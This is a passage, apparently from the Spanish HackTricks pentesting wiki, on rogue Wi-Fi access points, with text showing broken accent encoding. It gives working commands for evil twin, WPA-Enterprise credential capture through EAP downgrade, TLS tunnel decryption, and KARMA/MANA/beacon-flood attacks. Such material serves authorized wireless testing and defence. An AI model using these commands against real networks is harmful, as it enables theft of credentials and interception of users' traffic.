- El sondeo activo implica que las estaciones env√≠en solicitudes de sondeo para descubrir los APs cercanos y sus caracter√≠sticas.
- Las solicitudes de sondeo dirigidas apuntan a un ESSID espec√≠fico, ayudando a detectar si una red en particular est√° dentro del alcance, incluso si es una red oculta.
- Las solicitudes de sondeo de difusi√≥n tienen un campo SSID nulo y se env√≠an a todos los APs cercanos, permitiendo a la estaci√≥n buscar cualquier red preferida sin revelar el contenido de su PNL.

## AP simple con redirecci√≥n a Internet

Antes de explicar c√≥mo realizar ataques m√°s complejos, se explicar√° **c√≥mo** simplemente **crear** un **AP** y **redirigir** su **tr√°fico** a una interfaz conectada **a** Internet.

Usando `ifconfig -a`, verifica que la interfaz wlan para crear el AP y la interfaz conectada a Internet est√©n presentes.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Cree el archivo de configuraci√≥n `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Luego **configura las IPs** y las **rutas**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Y luego **inicie** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Cree un archivo de configuraci√≥n `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Detener procesos molestos**, establecer **modo monitor** y **iniciar hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Reenv√≠o y Redirecci√≥n
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Un ataque de evil twin explota la forma en que los clientes de WiFi reconocen las redes, confiando principalmente en el nombre de la red (ESSID) sin requerir que la estaci√≥n base (punto de acceso) se autentique ante el cliente. Los puntos clave incluyen:

- **Dificultad en la Diferenciaci√≥n**: Los dispositivos tienen dificultades para distinguir entre puntos de acceso leg√≠timos y falsos cuando comparten el mismo ESSID y tipo de cifrado. Las redes del mundo real a menudo utilizan m√∫ltiples puntos de acceso con el mismo ESSID para extender la cobertura de manera transparente.

- **Roaming de Cliente y Manipulaci√≥n de Conexi√≥n**: El protocolo 802.11 permite a los dispositivos moverse entre puntos de acceso dentro del mismo ESSID. Los atacantes pueden explotar esto atrayendo a un dispositivo para que se desconecte de su estaci√≥n base actual y se conecte a una falsa. Esto se puede lograr ofreciendo una se√±al m√°s fuerte o interrumpiendo la conexi√≥n al punto de acceso leg√≠timo a trav√©s de m√©todos como paquetes de deautenticaci√≥n o interferencia.

- **Desaf√≠os en la Ejecuci√≥n**: Ejecutar con √©xito un ataque de evil twin en entornos con m√∫ltiples puntos de acceso bien ubicados puede ser desafiante. Desautenticar un √∫nico punto de acceso leg√≠timo a menudo resulta en que el dispositivo se conecte a otro punto de acceso leg√≠timo a menos que el atacante pueda desautenticar todos los puntos de acceso cercanos o colocar estrat√©gicamente el punto de acceso falso.

Puedes crear un Evil Twin Abierto muy b√°sico (sin capacidades para enrutar tr√°fico a Internet) haciendo:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Tambi√©n puedes crear un Evil Twin usando **eaphammer** (ten en cuenta que para crear evil twins con eaphammer la interfaz **NO debe estar** en modo **monitor**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
O utilizando Airgeddon: `Opciones: 5,6,7,8,9 (dentro del men√∫ de ataque Evil Twin).`

![](<../../.gitbook/assets/image (148).png>)

Por favor, ten en cuenta que por defecto, si un ESSID en la PNL est√° guardado como protegido con WPA, el dispositivo no se conectar√° autom√°ticamente a un Evil Twin abierto. Puedes intentar realizar un DoS al AP real y esperar a que el usuario se conecte manualmente a tu Evil Twin abierto, o podr√≠as realizar un DoS al AP real y usar un Evil Twin con WPA para capturar el handshake (usando este m√©todo no podr√°s permitir que la v√≠ctima se conecte a ti ya que no conoces la PSK, pero puedes capturar el handshake e intentar crackearlo).

_Algunos sistemas operativos y antivirus advertir√°n al usuario que conectarse a una red abierta es peligroso..._

### Evil Twin WPA/WPA2

Puedes crear un **Evil Twin utilizando WPA/2** y si los dispositivos est√°n configurados para conectarse a ese SSID con WPA/2, intentar√°n conectarse. De todas formas, **para completar el handshake de 4 v√≠as** tambi√©n necesitas **saber** la **contrase√±a** que el cliente va a utilizar. Si **no la conoces**, la **conexi√≥n no se completar√°**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Evil Twin Empresarial

Para comprender estos ataques, recomendar√≠a leer primero la breve [explicaci√≥n de WPA Enterprise](./#wpa-enterprise-mgt).

**Usando hostapd-wpe**

`hostapd-wpe` necesita un archivo de **configuraci√≥n** para funcionar. Para **automatizar** la generaci√≥n de estas configuraciones, puedes utilizar [https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad) (descarga el archivo python dentro de _/etc/hostapd-wpe/_).
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
En el archivo de configuraci√≥n puedes seleccionar muchas cosas diferentes como ssid, canal, archivos de usuario, cret/key, par√°metros dh, versi√≥n de wpa y autenticaci√≥n...

[**Usando hostapd-wpe con EAP-TLS para permitir que cualquier certificado inicie sesi√≥n.**](evil-twin-eap-tls.md)

**Usando EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Por defecto, EAPHammer utiliza estos m√©todos de autenticaci√≥n (nota GTC como el primero para intentar obtener contrase√±as en texto plano y luego el uso de m√©todos de autenticaci√≥n m√°s robustos):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Este es el m√©todo predeterminado para evitar tiempos de conexi√≥n largos. Sin embargo, tambi√©n puedes especificar al servidor los m√©todos de autenticaci√≥n de m√°s d√©biles a m√°s fuertes:
```
--negotiate weakest
```
O tambi√©n puedes usar:

* `--negotiate gtc-downgrade` para utilizar una implementaci√≥n altamente eficiente de degradaci√≥n GTC (contrase√±as en texto plano)
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` para especificar manualmente los m√©todos ofrecidos (ofrecer los mismos m√©todos de autenticaci√≥n en el mismo orden que la organizaci√≥n har√° que el ataque sea mucho m√°s dif√≠cil de detectar).
* [Encuentra m√°s informaci√≥n en la wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Usando Airgeddon**

`Airgeddon` puede usar certificados generados previamente para ofrecer autenticaci√≥n EAP a redes WPA/WPA2-Enterprise. La red falsa degradar√° el protocolo de conexi√≥n a EAP-MD5 para poder **capturar al usuario y el MD5 de la contrase√±a**. Posteriormente, el atacante puede intentar descifrar la contrase√±a.\
`Airggedon` te ofrece la posibilidad de un ataque de Evil Twin **continuo (ruidoso)** o **solo crear el ataque de Evil Twin hasta que alguien se conecte (discreto).**

![](<../../.gitbook/assets/image (129).png>)

### Depuraci√≥n de t√∫neles TLS PEAP y EAP-TTLS en ataques de Evil Twins

_Este m√©todo fue probado en una conexi√≥n PEAP pero como estoy descifrando un t√∫nel TLS arbitrario esto tambi√©n deber√≠a funcionar con EAP-TTLS_

Dentro de la **configuraci√≥n** de _hostapd-wpe_ **comenta** la l√≠nea que contiene _**dh\_file**_ (de `dh_file=/etc/hostapd-wpe/certs/dh` a `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Esto har√° que `hostapd-wpe` **intercambie claves usando RSA** en lugar de DH, por lo que podr√°s **descifrar** el tr√°fico m√°s tarde **conociendo la clave privada del servidor**.

Ahora inicia el **Evil Twin** usando **`hostapd-wpe`** con esa configuraci√≥n modificada como de costumbre. Adem√°s, inicia **`wireshark`** en la **interfaz** que est√° realizando el ataque de Evil Twin.

Ahora o m√°s tarde (cuando ya hayas capturado algunos intentos de autenticaci√≥n) puedes agregar la clave privada RSA a wireshark en: `Editar --> Preferencias --> Protocolos --> TLS --> (Lista de claves RSA) Editar...`

Agrega una nueva entrada y completa el formulario con estos valores: **Direcci√≥n IP = cualquier** -- **Puerto = 0** -- **Protocolo = datos** -- **Archivo de clave** (**selecciona tu archivo de clave**, para evitar problemas selecciona un archivo de clave **sin protecci√≥n con contrase√±a**).

![](<../../.gitbook/assets/image (151).png>)

Y observa la nueva pesta√±a **"TLS descifrado"**:

![](<../../.gitbook/assets/image (152).png>)

## Ataque KARMA, MANA, MANA ruidoso y Beacons conocidos

### Listas negras y blancas de ESSID y MAC

Diferentes tipos de Listas de Filtro de Control de Acceso a Medios (MFACLs) y sus modos correspondientes y efectos en el comportamiento de un Punto de Acceso (AP) falso:

1. **Lista blanca basada en MAC**:
- El AP falso responder√° solo a las solicitudes de sondeo de dispositivos especificados en la lista blanca, permaneciendo invisible para todos los dem√°s no listados.

2. **Lista negra basada en MAC**:
- El AP falso ignorar√° las solicitudes de sondeo de dispositivos en la lista negra, haciendo efectivamente invisible al AP falso para esos dispositivos espec√≠ficos.

3. **Lista blanca basada en ESSID**:
- El AP falso responder√° a las solicitudes de sondeo solo para los ESSIDs espec√≠ficos listados, haci√©ndose invisible para los dispositivos cuyas Listas de Redes Preferidas (PNLs) no contienen esos ESSIDs.

4. **Lista negra basada en ESSID**:
- El AP falso no responder√° a las solicitudes de sondeo para los ESSIDs espec√≠ficos en la lista negra, haci√©ndose invisible para los dispositivos que buscan esas redes particulares.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Este m√©todo permite a un **atacante crear un punto de acceso (AP) malicioso que responde a todas las solicitudes de sondeo** de dispositivos que buscan conectarse a redes. Esta t√©cnica **enga√±a a los dispositivos para que se conecten al AP del atacante** al imitar las redes que los dispositivos est√°n buscando. Una vez que un dispositivo env√≠a una solicitud de conexi√≥n a este AP falso, completa la conexi√≥n, lo que lleva al dispositivo a conectarse err√≥neamente a la red del atacante.

### MANA

Luego, **los dispositivos comenzaron a ignorar las respuestas de red no solicitadas**, reduciendo la efectividad del ataque karma original. Sin embargo, se introdujo un nuevo m√©todo, conocido como el **ataque MANA**, por Ian de Villiers y Dominic White. Este m√©todo implica que el AP falso **capture las Listas de Redes Preferidas (PNL) de los dispositivos respondiendo a sus solicitudes de sondeo de difusi√≥n** con nombres de redes (SSIDs) previamente solicitados por los dispositivos. Este sofisticado ataque elude las protecciones contra el ataque karma original al explotar la forma en que los dispositivos recuerdan y priorizan las redes conocidas.

El ataque MANA opera monitoreando tanto las solicitudes de sondeo dirigidas como las de difusi√≥n de los dispositivos. Para las solicitudes dirigidas, registra la direcci√≥n MAC del dispositivo y el nombre de red solicitado, agregando esta informaci√≥n a una lista. Cuando se recibe una solicitud de difusi√≥n, el AP responde con informaci√≥n que coincide con cualquiera de las redes en la lista del dispositivo, atrayendo al dispositivo a conectarse al AP falso.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Ataque Loud MANA

Un ataque **Loud MANA** es una estrategia avanzada para cuando los dispositivos no utilizan sondeos dirigidos o cuando sus Listas de Redes Preferidas (PNL) son desconocidas para el atacante. Opera bajo el principio de que **los dispositivos en la misma √°rea probablemente compartan algunos nombres de redes en sus PNL**. En lugar de responder selectivamente, este ataque transmite respuestas de sondeo para cada nombre de red (ESSID) encontrado en las PNL combinadas de todos los dispositivos observados. Este enfoque amplio aumenta la posibilidad de que un dispositivo reconozca una red familiar e intente conectarse al Punto de Acceso (AP) falso.
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Ataque de Beacon Conocido

Cuando el **ataque Loud MANA** no es suficiente, el **ataque de Beacon Conocido** presenta otro enfoque. Este m√©todo **fuerza el proceso de conexi√≥n simulando un AP que responde a cualquier nombre de red, recorriendo una lista de posibles ESSIDs derivados de una lista de palabras. Esto simula la presencia de numerosas redes, con la esperanza de que coincida un ESSID dentro de la PNL de la v√≠ctima, provocando un intento de conexi√≥n al AP fabricado. El ataque puede ser amplificado al combinarlo con la opci√≥n `--loud` para un intento m√°s agresivo de atrapar dispositivos.

Eaphammer implement√≥ este ataque como un ataque MANA donde todos los ESSIDs dentro de una lista son cargados (tambi√©n se puede combinar con `--loud` para crear un ataque Loud MANA + Beacon Conocido):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Ataque de R√°faga de Beacons Conocidos**

El **ataque de R√°faga de Beacons Conocidos** implica **la transmisi√≥n r√°pida de tramas de beacons para cada ESSID listado en un archivo**. Esto crea un entorno denso de redes falsas, aumentando en gran medida la probabilidad de que los dispositivos se conecten al AP malicioso, especialmente cuando se combina con un ataque MANA. Esta t√©cnica aprovecha la velocidad y el volumen para abrumar los mecanismos de selecci√≥n de red de los dispositivos.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** es un protocolo que permite a los dispositivos conectarse directamente entre s√≠ utilizando Wi-Fi sin necesidad de un punto de acceso inal√°mbrico tradicional. Esta capacidad est√° integrada en varios dispositivos de Internet de las cosas (IoT), como impresoras y televisores, facilitando la comunicaci√≥n directa de dispositivo a dispositivo. Una caracter√≠stica notable de Wi-Fi Direct es que un dispositivo asume el papel de un punto de acceso, conocido como el propietario del grupo, para gestionar la conexi√≥n.

La seguridad para las conexiones de Wi-Fi Direct se establece a trav√©s de **Wi-Fi Protected Setup (WPS)**, que admite varios m√©todos para el emparejamiento seguro, incluidos:
- **Configuraci√≥n de bot√≥n de empuje (PBC)**
- **Entrada de PIN**
- **Comunicaci√≥n de campo cercano (NFC)**

Estos m√©todos, especialmente la entrada de PIN, son susceptibles a las mismas vulnerabilidades que WPS en las redes Wi-Fi tradicionales, lo que los convierte en objetivos para vectores de ataque similares.

### Secuestro de EvilDirect

**Secuestro de EvilDirect** es un ataque espec√≠fico para Wi-Fi Direct. Refleja el concepto de un ataque de Evil Twin pero se dirige a las conexiones de Wi-Fi Direct. En este escenario, un atacante se hace pasar por un propietario de grupo leg√≠timo con el objetivo de enga√±ar a los dispositivos para que se conecten a una entidad maliciosa. Este m√©todo se puede ejecutar utilizando herramientas como `airbase-ng` especificando el canal, ESSID y la direcci√≥n MAC del dispositivo suplantado:

## Referencias

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
* [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)

TODO: Echa un vistazo a [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (inicio de sesi√≥n con Facebook e imitaci√≥n de WPA en portales cautivos)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

√önete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de recompensas por errores!

**Perspectivas de Hacking**\
Invol√∫crate con contenido que profundiza en la emoci√≥n y los desaf√≠os del hacking

**Noticias de Hacking en Tiempo Real**\
Mantente actualizado con el mundo del hacking a trav√©s de noticias e informaci√≥n en tiempo real

**√öltimos Anuncios**\
Mantente informado sobre los nuevos programas de recompensas por errores que se lanzan y las actualizaciones cruciales de la plataforma

**√önete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ¬°y comienza a colaborar con los mejores hackers hoy!

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas que tu **empresa sea anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
